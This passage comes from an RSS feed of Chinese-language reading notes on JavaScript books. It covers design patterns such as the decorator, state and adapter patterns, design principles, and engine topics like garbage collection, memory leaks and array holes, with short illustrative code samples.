  param<span>.</span>Token <span>=</span> <span>getToken</span><span>(</span><span>)</span>
<span>}</span><span>)</span>
<span>ajax</span><span>(</span><span>'get'</span><span>,</span> <span>'http:// xxx.com/userinfo'</span><span>,</span> <span>{</span> <span>name</span><span>:</span> <span>'sven'</span> <span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><ul>
<li>插件式的表单验证。</li>
</ul>
<div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>before</span> <span>=</span> <span>function</span><span>(</span><span>beforefn</span><span>)</span> <span>{</span>
  <span>var</span> __self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>beforefn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span> <span>===</span> <span>false</span><span>)</span> <span>{</span>
      <span>// beforefn 返回 false 的情况直接 return，不再执行后面的原函数</span>
      <span>return</span>
    <span>}</span>
    <span>return</span> <span>__self</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
  <span>}</span>
<span>}</span>
<span>var</span> <span>validata</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>username<span>.</span>value <span>===</span> <span>''</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>'用户名不能为空'</span><span>)</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>if</span> <span>(</span>password<span>.</span>value <span>===</span> <span>''</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>'密码不能为空'</span><span>)</span>
    <span>return</span> <span>false</span>
  <span>}</span>
<span>}</span>
<span>var</span> <span>formSubmit</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> param <span>=</span> <span>{</span>
    <span>username</span><span>:</span> username<span>.</span>value<span>,</span>
    <span>password</span><span>:</span> password<span>.</span>value<span>,</span>
  <span>}</span>
  <span>ajax</span><span>(</span><span>'http:// xxx.com/login'</span><span>,</span> param<span>)</span>
<span>}</span>
formSubmit <span>=</span> formSubmit<span>.</span><span>before</span><span>(</span>validata<span>)</span>
submitBtn<span>.</span><span>onclick</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>formSubmit</span><span>(</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br></div></div><ul>
<li>值得注意的是，因为函数通过 Function.prototype.before 或者 Function.prototype.after 被装饰之后，返回的实际上是一个新的函数，如果在原函数上保存了一些属性，那么这些属性会丢失。</li>
</ul>
<div><pre><code><span>var</span> <span>func</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span>1</span><span>)</span>
<span>}</span>
func<span>.</span>a <span>=</span> <span>'a'</span>
func <span>=</span> func<span>.</span><span>after</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span>2</span><span>)</span>
<span>}</span><span>)</span>
<span>alert</span><span>(</span>func<span>.</span>a<span>)</span> <span>// 输出：undefined</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_38-装饰者模式和代理模式"> 38. 装饰者模式和代理模式</h2>
<ul>
<li>
<p>装饰者模式和代理模式的结构看起来非常相像，这两种模式都描述了怎样为对象提供一定程度上的间接引用，它们的实现部分都保留了对另外一个对象的引用，并且向那个对象发送请求。</p>
</li>
<li>
<p>代理模式和装饰者模式最重要的区别在于它们的意图和设计目的。代理模式的目的是，当直接访问本体不方便或者不符合需要时，为这个本体提供一个替代者。本体定义了关键功能，而代理提供或拒绝对它的访问，或者在访问本体之前做一些额外的事情。装饰者模式的作用就是为对象动态加入行为。换句话说，代理模式强调一种关系（Proxy 与它的实体之间的关系），这种关系可以静态的表达，也就是说，这种关系在一开始就可以被确定。而装饰者模式用于一开始不能确定对象的全部功能时。代理模式通常只有一层 代理—本体 的引用，而装饰者模式经常会形成一条长长的装饰链。</p>
</li>
<li>
<p>在虚拟代理实现图片预加载的例子中，本体负责设置 img 节点的 src，代理则提供了预加载的功能，这看起来也是 “加入行为” 的一种方式，但这种加入行为的方式和装饰者模式的偏重点是不一样的。装饰者模式是实实在在的为对象增加新的职责和行为，而代理做的事情还是跟本体一样，最终都是设置 src。但代理可以加入一些 “聪明” 的功能，比如在图片真正加载好之前，先使用一张占位的 loading 图片反馈给客户。</p>
</li>
</ul>
<h2 id="_39-状态模式"> 39. 状态模式</h2>
<ul>
<li>
<p>状态模式是一种非同寻常的优秀模式，它也许是解决某些需求场景的最好方法。虽然状态模式并不是一种简单到一目了然的模式（它往往还会带来代码量的增加），但你一旦明白了状态模式的精髓，以后一定会感谢它带给你的无与伦比的好处。</p>
</li>
<li>
<p>状态模式的关键是区分事物内部的状态，事物内部状态的改变往往会带来事物的行为改变。</p>
</li>
<li>
<p>状态模式的定义：允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎修改了它的类。</p>
</li>
</ul>
<h2 id="_40-状态模式的优缺点"> 40. 状态模式的优缺点</h2>
<ul>
<li>
<p>状态模式定义了状态与行为之间的关系，并将它们封装在一个类里。通过增加新的状态类，很容易增加新的状态和转换。</p>
</li>
<li>
<p>避免 Context 无限膨胀，状态切换的逻辑被分布在状态类中，也去掉了 Context 中原本过多的条件分支。</p>
</li>
<li>
<p>用对象代替字符串来记录当前状态，使得状态的切换更加一目了然。</p>
</li>
<li>
<p>Context 中的请求动作和状态类中封装的行为可以非常容易地独立变化而互不影响。</p>
</li>
</ul>
<h2 id="_41-状态模式和策略模式的关系"> 41. 状态模式和策略模式的关系</h2>
<ul>
<li>
<p>状态模式和策略模式像一对双胞胎，它们都封装了一系列的算法或者行为，它们的类图看起来几乎一模一样，但在意图上有很大不同，因此它们是两种迥然不同的模式。</p>
</li>
<li>
<p>策略模式和状态模式的相同点是，它们都有一个上下文、一些策略或者状态类，上下文把请求委托给这些类来执行。</p>
</li>
<li>
<p>它们之间的区别是策略模式中的各个策略类之间是平等又平行的，它们之间没有任何联系，所以客户必须熟知这些策略类的作用，以便客户可以随时主动切换算法。而在状态模式中，状态和状态对应的行为是早已被封装好的，状态之间的切换也早被规定完成，“改变行为” 这件事情发生在状态模式内部。对客户来说，并不需要了解这些细节，这正是状态模式的作用所在。</p>
</li>
</ul>
<h2 id="_42-javascript-版本的状态机"> 42. JavaScript 版本的状态机</h2>
<div><pre><code><span>var</span> <span>delegate</span> <span>=</span> <span>function</span><span>(</span><span>client<span>,</span> delegation</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>buttonWasPressed</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
      <span>// 将客户的操作委托给 delegation 对象</span>
      <span>return</span> delegation<span>.</span><span>buttonWasPressed</span><span>.</span><span>apply</span><span>(</span>client<span>,</span> arguments<span>)</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>
<span>var</span> <span>FSM</span> <span>=</span> <span>{</span>
  <span>off</span><span>:</span> <span>{</span>
    <span>buttonWasPressed</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'关灯'</span><span>)</span>
      <span>this</span><span>.</span>button<span>.</span>innerHTML <span>=</span> <span>'下一次按我是开灯'</span>
      <span>this</span><span>.</span>currState <span>=</span> <span>this</span><span>.</span>onState
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>on</span><span>:</span> <span>{</span>
    <span>buttonWasPressed</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'开灯'</span><span>)</span>
      <span>this</span><span>.</span>button<span>.</span>innerHTML <span>=</span> <span>'下一次按我是关灯'</span>
      <span>this</span><span>.</span>currState <span>=</span> <span>this</span><span>.</span>offState
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> <span>Light</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>offState <span>=</span> <span>delegate</span><span>(</span><span>this</span><span>,</span> <span>FSM</span><span>.</span>off<span>)</span>
  <span>this</span><span>.</span>onState <span>=</span> <span>delegate</span><span>(</span><span>this</span><span>,</span> <span>FSM</span><span>.</span>on<span>)</span>
  <span>this</span><span>.</span>currState <span>=</span> <span>this</span><span>.</span>offState <span>// 设置初始状态为关闭状态</span>
  <span>this</span><span>.</span>button <span>=</span> <span>null</span>
<span>}</span>
<span>Light</span><span>.</span>prototype<span>.</span><span>init</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> button <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'button'</span><span>)</span><span>,</span>
    self <span>=</span> <span>this</span>
  button<span>.</span>innerHTML <span>=</span> <span>'已关灯'</span>
  <span>this</span><span>.</span>button <span>=</span> document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>button<span>)</span>
  <span>this</span><span>.</span>button<span>.</span><span>onclick</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    self<span>.</span>currState<span>.</span><span>buttonWasPressed</span><span>(</span><span>)</span>
  <span>}</span>
<span>}</span>
<span>var</span> light <span>=</span> <span>new</span> <span>Light</span><span>(</span><span>)</span>
light<span>.</span><span>init</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br></div></div><h2 id="_43-适配器模式"> 43. 适配器模式</h2>
<ul>
<li>
<p>适配器模式的作用是解决两个软件实体间的接口不兼容的问题。使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体可以一起工作。</p>
</li>
<li>
<p>适配器的别名是包装器（wrapper），这是一个相对简单的模式。在程序开发中有许多这样的场景：当我们试图调用模块或者对象的某个接口时，却发现这个接口的格式并不符合目前的需求。这时候有两种解决办法，第一种是修改原来的接口实现，但如果原来的模块很复杂，或者我们拿到的模块是一段别人编写的经过压缩的代码，修改原接口就显得不太现实了。第二种办法是创建一个适配器，将原接口转换为客户希望的另一个接口，客户只需要和适配器打交道。</p>
</li>
<li>
<p>小结：适配器模式是一对相对简单的模式。在本书提到的设计模式中，有一些模式跟适配器模式的结构非常相似，比如装饰者模式、代理模式和外观模式。这几种模式都属于 “包装模式”，都是由一个对象来包装另一个对象。区别它们的关键仍然是模式的意图。</p>
<blockquote>
<ul>
<li>适配器模式主要用来解决两个已有接口之间不匹配的问题，它不考虑这些接口是怎样实现的，也不考虑它们将来可能会如何演化。适配器模式不需要改变已有的接口，就能够使它们协同作用。</li>
<li>装饰者模式和代理模式也不会改变原有对象的接口，但装饰者模式的作用是为了给对象增加功能。装饰者模式常常形成一条长的装饰链，而适配器模式通常只包装一次。代理模式是为了控制对对象的访问，通常也只包装一次。</li>
<li>外观模式的作用倒是和适配器比较相似，有人把外观模式看成一组对象的适配器，但外观模式最显著的特点是定义了一个新的接口。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_44-适配器模式的应用"> 44. 适配器模式的应用</h2>
<ul>
<li>如果现有的接口已经能够正常工作，那我们就永远不会用上适配器模式。适配器模式是一种 “亡羊补牢” 的模式，没有人会在程序的设计之初就使用它。因为没有人可以完全预料到未来的事情，也许现在好好工作的接口，未来的某天却不再适用于新系统，那么我们可以用适配器模式把旧接口包装成一个新的接口，使它继续保持生命力。</li>
</ul>
<h2 id="_45-单一职责原则"> 45. 单一职责原则</h2>
<ul>
<li>
<p>单一职责原则（SRP）的职责被定义为 “引起变化的原因”。如果我们有两个动机去改写一个方法，那么这个方法就具有两个职责。每个职责都是变化的一个轴线，如果一个方法承担了过多的职责，那么在需求的变迁过程中，需要改写这个方法的可能性就越大。</p>
</li>
<li>
<p>SRP 原则体现为：一个对象（方法）只做一件事情。</p>
</li>
<li>
<p>SRP 原则在很多设计模式中都有着广泛的运用，例如代理模式、迭代器模式、单例模式和装饰者模式。</p>
</li>
</ul>
<h2 id="_46-srp-原则的优缺点"> 46. SRP 原则的优缺点</h2>
<ul>
<li>
<p>SRP 原则的优点是降低了单个类或者对象的复杂度，按照职责把对象分解成更小的粒度，这有助于代码的复用，也有利于进行单元测试。当一个职责需要变更的时候，不会影响到其他的职责。</p>
</li>
<li>
<p>但 SRP 原则也有一些缺点，最明显的是会增加编写代码的复杂度。当我们按照职责把对象分解成更小的粒度之后，实际上也增大了这些对象之间相互联系的难度。</p>
</li>
</ul>
<h2 id="_47-最少知识原则"> 47. 最少知识原则</h2>
<ul>
<li>
<p>最少知识原则（LKP）说的是一个软件实体应当尽可能少地与其他实体发生相互作用。这里的软件实体是一个广义的概念，不仅包括对象，还包括系统、类、模块、函数、变量等。</p>
</li>
<li>
<p>其实，最少知识原则也叫迪米特法则（Law of Demeter，LoD），“迪米特” 这个名字源自 1987 年美国东北大学一个名为 “Demeter”的研究项目。</p>
</li>
<li>
<p>最少知识原则在设计模式中体现得最多的地方是中介者模式和外观模式。</p>
</li>
</ul>
<h2 id="_48-开放-封闭原则"> 48. 开放 — 封闭原则</h2>
<ul>
<li>
<p>在面向对象的程序设计中，开放—封闭原则（OCP）是最重要的一条原则。很多时候，一个程序具有良好的设计，往往说明它是符合开放—封闭原则的。</p>
</li>
<li>
<p>开放—封闭原则最早由 Eiffel 语言的设计者 Bertrand Meyer 在其著作 Object-Oriented SoftwareConstruction 中提出。它的定义如下。</p>
<blockquote>
<p>软件实体（类、模块、函数）等应该是可以扩展的，但是不可修改。</p>
</blockquote>
</li>
<li>
<p>开放—封闭原则的思想：当需要改变一个程序的功能或者给这个程序增加新功能的时候，可以使用增加代码的方式，但是不允许改动程序的源代码（hook 与 callback）。</p>
</li>
</ul>
<h2 id="_49-设计模式中的开放-封闭原则"> 49. 设计模式中的开放 — 封闭原则</h2>
<ul>
<li>有一种说法是，设计模式就是给做的好的设计取个名字。几乎所有的设计模式都是遵守开放—封闭原则的，我们见到的好设计，通常都经得起开放—封闭原则的考验。不管是具体的各种设计模式，还是更抽象的面向对象设计原则，比如单一职责原则、最少知识原则、依赖倒置原则等，都是为了让程序遵守开放—封闭原则而出现的。可以这样说，开放—封闭原则是编写一个好程序的目标，其他设计原则都是达到这个目标的过程。</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>JavaScript 语言精粹与编程实践（第三版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-Essence/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-Essence/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 语言精粹与编程实践（第三版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>JavaScript 权威指南（第七版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-Guide/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-Guide/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 权威指南（第七版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>JavaScript 忍者秘籍（第二版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-Ninja-Secrets/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-Ninja-Secrets/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 忍者秘籍（第二版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h1 id="有点可惜"> 有点可惜......</h1>
]]></content:encoded>
    </item>
    <item>
      <title>JavaScript 高级程序设计（第四版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-Programming/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-Programming/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 高级程序设计（第四版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-html-中的-javascript"> 1. HTML 中的 JavaScript</h2>
<ul>
<li>
<p>要包含外部 JavaScript 文件，必须将 src 属性设置为要包含文件的 URL。文件可以跟网页在同一台服务器上，也可以位于完全不同的域。</p>
</li>
<li>
<p>所有 <code>&lt;script&gt;</code> 元素会依照它们在网页中出现的次序被解释。在不使用 defer 和 async 属性的情况下，包含在 <code>&lt;script&gt;</code> 元素中的代码必须严格按次序解释。</p>
</li>
<li>
<p>对不推迟执行的脚本，浏览器必须解释完位于 <code>&lt;script&gt;</code> 元素中的代码，然后才能继续渲染页面的剩余部分。为此，通常应该把 <code>&lt;script&gt;</code> 元素放到页面末尾，介于主内容之后及 <code>&lt;body&gt;</code> 标签之前。</p>
</li>
<li>
<p>可以使用 defer 属性把脚本推迟到文档渲染完毕后再执行。推迟的脚本原则上按照它们被列出的次序执行。</p>
</li>
<li>
<p>可以使用 async 属性表示脚本不需要等待其他脚本，同时也不阻塞文档渲染，即异步加载。异步脚本不能保证按照它们在页面中出现的次序执行。</p>
</li>
<li>
<p>通过使用 <code>&lt;noscript&gt;</code> 元素，可以指定在浏览器不支持脚本时显示的内容。如果浏览器支持并启用脚本，则 <code>&lt;noscript&gt;</code> 元素中的任何内容都不会被渲染。</p>
</li>
</ul>
<h2 id="_2-垃圾回收"> 2. 垃圾回收</h2>
<ul>
<li>
<p>标记清理。</p>
<blockquote>
<ul>
<li>JavaScript 最常用的垃圾回收策略是标记清理（mark-and-sweep）。当变量进入上下文，比如在函数内部声明一个变量时，这个变量会被加上存在于上下文中的标记。而在上下文中的变量，逻辑上讲，永远不应该释放它们的内存，因为只要上下文中的代码在运行，就有可能用到它们。当变量离开上下文时，也会被加上离开上下文的标记。</li>
<li>垃圾回收程序运行的时候，会标记内存中存储的所有变量（记住，标记方法有很多种）。然后，它会将所有在上下文中的变量，以及被在上下文中的变量引用的变量的标记去掉。在此之后再被加上标记的变量就是待删除的了，原因是任何在上下文中的变量都访问不到它们了。随后垃圾回收程序做一次内存清理，销毁带标记的所有值并收回它们的内存。</li>
</ul>
</blockquote>
</li>
<li>
<p>引用计数。</p>
<blockquote>
<p>另一种没那么常用的垃圾回收策略是引用计数（reference counting）。其思路是对每个值都记录它被引用的次数，声明变量并给它赋一个引用值时，这个值的引用数为 1。如果同一个值又被赋给另一个变量，那么引用数加 1。类似地，如果保存对该值引用的变量被其他值给覆盖了，那么引用数减 1。当一个值的引用数为 0 时，就说明没办法再访问到这个值了，因此可以安全地收回其内存了。垃圾回收程序下次运行的时候就会释放引用数为 0 的值的内存。</p>
</blockquote>
<div><pre><code><span>function</span> <span>problem</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> objectA <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span>
  <span>let</span> objectB <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span>
  objectA<span>.</span>someOtherObject <span>=</span> objectB
  objectB<span>.</span>anotherObject <span>=</span> objectA
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><blockquote>
<p>在这个例子中， objectA 和 objectB 通过各自的属性相互引用，意味着它们的引用数都是 2。在标记清理策略下，这不是问题，因为在函数结束后，这两个对象都不在作用域中。而在引用计数策略下，objectA 和 objectB 在函数结束后还会存在，因为它们的引用数远不会变成 0。如果函数被多次调用，则会导致大量内存永远不会被释放。为此，Netscape 在 4.0 版放弃了引用计数，转而采用标记清理。事实上，引用计数策略的问题还不止于此。</p>
</blockquote>
</li>
</ul>
<h2 id="_3-内存管理"> 3. 内存管理</h2>
<ul>
<li>
<p>通过 const 和 let 声明提升性能。</p>
<blockquote>
<p>ES6 增加这两个关键字不仅有助于改善代码风格，而且同样有助于改进垃圾回收的过程。因为 const 和 let 都以块（而非函数）为作用域，所以相比于使用 var，使用这两个新关键字可能会更早地让垃圾回收程序介入，尽早回收应该回收的内存。在块作用域比函数作用域更早终止的情况下，这就有可能发生。</p>
</blockquote>
</li>
<li>
<p>隐藏类和删除操作。</p>
<blockquote>
<p>动态删除属性与动态添加属性导致的后果一样。最佳实践是把不想要的属性设置为 null。这样可以保持隐藏类不变和继续共享，同时也能达到删除引用值供垃圾回收程序回收的效果。</p>
</blockquote>
<div><pre><code><span>function</span> <span>Article</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>title <span>=</span> <span>'Inauguration Ceremony Features Kazoo Band'</span>
  <span>this</span><span>.</span>author <span>=</span> <span>'Jake'</span>
<span>}</span>

<span>let</span> a1 <span>=</span> <span>new</span> <span>Article</span><span>(</span><span>)</span>
<span>let</span> a2 <span>=</span> <span>new</span> <span>Article</span><span>(</span><span>)</span>
a1<span>.</span>author <span>=</span> <span>null</span> <span>// 继续共享隐藏类</span>

<span>// a1.attr = 777; // 不再共享隐藏类</span>
<span>// delete a1.author; // 不再共享隐藏类</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<p>内存泄漏。</p>
<blockquote>
<p>意外声明全局变量是最常见但也最容易修复的内存泄漏问题：解释器会把变量 name 当作 window 的属性来创建。</p>
</blockquote>
<div><pre><code><span>function</span> <span>setName</span><span>(</span><span>)</span> <span>{</span>
  name <span>=</span> <span>'Jake'</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<p>定时器也可能会悄悄地导致内存泄漏：只要定时器一直运行，回调函数中引用的 name 就会一直占用内存。</p>
</blockquote>
<div><pre><code><span>let</span> name <span>=</span> <span>'Jake'</span>
<span>setInterval</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>name<span>)</span>
<span>}</span><span>,</span> <span>100</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><blockquote>
<p>使用 JavaScript 闭包很容易在不知不觉间造成内存泄漏：调用 outer() 会导致分配给 name 的内存被泄漏。以上代码执行后创建了一个内部闭包，只要返回的函数存在就不能清理 name，因为闭包一直在引用着它。</p>
</blockquote>
<div><pre><code><span>let</span> <span>outer</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> name <span>=</span> <span>'Jake'</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> name
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>
<li>
<p>静态分配与对象池。</p>
<blockquote>
<ul>
<li>为了提升 JavaScript 性能，最后要考虑的一点往往就是压榨浏览器了。此时，一个关键问题就是如何减少浏览器执行垃圾回收的次数。开发者无法直接控制什么时候开始收集垃圾，但可以间接控制触发垃圾回收的条件。理论上，如果能够合理使用分配的内存，同时避免多余的垃圾回收，那就可以保住因释放内存而损失的性能。</li>
<li>静态分配是优化的一种极端形式。如果你的应用程序被垃圾回收严重地拖了后腿，可以利用它提升性能。但这种情况并不多见，大多数情况下，这都属于过早优化，因此不用考虑。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_4-原始值包装类型"> 4. 原始值包装类型</h2>
<ul>
<li>
<p>装箱与拆箱（在以读模式访问字符串值的任何时候，后台都会执行以下 3 步）。</p>
<ol>
<li>创建一个 String 类型的实例。</li>
<li>调用实例上的特定方法。</li>
<li>销毁实例。</li>
</ol>
<blockquote>
<p>可以把这 3 步想象成执行了如下 3 行 ECMAScript 代码。</p>
</blockquote>
<div><pre><code><span>let</span> s1 <span>=</span> <span>'some text'</span>
<span>let</span> s2 <span>=</span> s1<span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span>

<span>// 想象的装箱与拆箱</span>
<span>let</span> s1 <span>=</span> <span>new</span> <span>String</span><span>(</span><span>'some text'</span><span>)</span>
<span>let</span> s2 <span>=</span> s1<span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span>
s1 <span>=</span> <span>null</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><blockquote>
<ul>
<li>引用类型与原始值包装类型的主要区别在于对象的生命周期。在通过 new 实例化引用类型后，得到的实例会在离开作用域时被销毁，而自动创建的原始值包装对象则只存在于访问它的那行代码执行期间。这意味着不能在运行时给原始值添加属性和方法。</li>
<li>这里的第二行代码尝试给字符串 s1 添加了一个 color 属性。可是，第三行代码访问 color 属性时，它却不见了。原因就是第二行代码运行时会临时创建一个 String 对象，而当第三行代码执行时，这个对象已经被销毁了。实际上，第三行代码在这里创建了自己的 String 对象，但这个对象没有 color 属性。</li>
</ul>
</blockquote>
<div><pre><code><span>let</span> s1 <span>=</span> <span>'some text'</span>
s1<span>.</span>color <span>=</span> <span>'red'</span>
console<span>.</span><span>log</span><span>(</span>s1<span>.</span>color<span>)</span> <span>// undefined</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_5-单例内置对象"> 5. 单例内置对象</h2>
<ul>
<li>
<p>Global 对象。</p>
<blockquote>
<p>Global 对象是 ECMAScript 中最特别的对象，因为代码不会显式地访问它。ECMA-262 规定 Global 对象为一种兜底对象，它所针对的是不属于任何对象的属性和方法。事实上，不存在全局变量或全局函数这种东西。在全局作用域中定义的变量和函数都会变成 Global 对象的属性。本书前面介绍的函数，包括 isNaN()、isFinite()、parseInt() 和 parseFloat()，实际上都是 Global 对象的方法。除了这些，Global 对象上还有另外一些方法。</p>
</blockquote>
</li>
<li>
<p>window 对象。</p>
<blockquote>
<p>虽然 ECMA-262 没有规定直接访问 Global 对象的方式，但浏览器将 window 对象实现为 Global 对象的代理。因此，所有全局作用域中声明的变量和函数都变成了 window 的属性。</p>
</blockquote>
</li>
<li>
<p>Math。</p>
<blockquote>
<p>Math 对象上提供的计算要比直接在 JavaScript 实现的快得多，因为 Math 对象上的计算使用了 JavaScript 引擎中更高效的实现和处理器指令。但使用 Math 计算的问题是精度会因浏览器、操作系统、指令集和硬件而异。</p>
</blockquote>
</li>
</ul>
<h2 id="_6-object"> 6. Object</h2>
<ul>
<li>在使用对象字面量表示法定义对象时，并不会实际调用 Object 构造函数。</li>
</ul>
<h2 id="_7-array"> 7. Array</h2>
<ul>
<li>
<p>与对象一样，在使用数组字面量表示法创建数组不会调用 Array 构造函数。</p>
</li>
<li>
<p>数组空位。</p>
<blockquote>
<ul>
<li>使用数组字面量初始化数组时，可以使用一串逗号来创建空位（hole）。ECMAScript 会将逗号之间相应索引位置的值当成空位，ES6 规范重新定义了该如何处理这些空位。</li>
<li>ES6 新增的方法和迭代器与早期 ECMAScript 版本中存在的方法行为不同。ES6 新增方法普遍将这些空位当成存在的元素，只不过值为 undefined。ES6 之前的方法则会忽略这个空位，但具体的行为也会因方法而异。</li>
<li>由于行为不一致和存在性能隐患，因此实践中要避免使用数组空位。如果确实需要空位，则可以显式地用 undefined 值代替。</li>
</ul>
</blockquote>
<div><pre><code><span>const</span> options <span>=</span> <span>[</span><span>1</span><span>,</span> <span>,</span> <span>,</span> <span>,</span> <span>5</span><span>]</span>

<span>// ES6</span>
<span>for</span> <span>(</span><span>const</span> option <span>of</span> options<span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>option <span>===</span> <span>undefined</span><span>)</span>
<span>}</span>
<span>// false</span>
<span>// true</span>
<span>// true</span>
<span>// true</span>
<span>// false</span>

<span>// ES5</span>
<span>// map()会跳过空位置</span>
console<span>.</span><span>log</span><span>(</span>options<span>.</span><span>map</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>6</span><span>)</span><span>)</span> <span>// [6, undefined, undefined, undefined, 6]</span>
<span>// join()视空位置为空字符串</span>
console<span>.</span><span>log</span><span>(</span>options<span>.</span><span>join</span><span>(</span><span>'-'</span><span>)</span><span>)</span> <span>// "1----5"</span>
</code></pre>
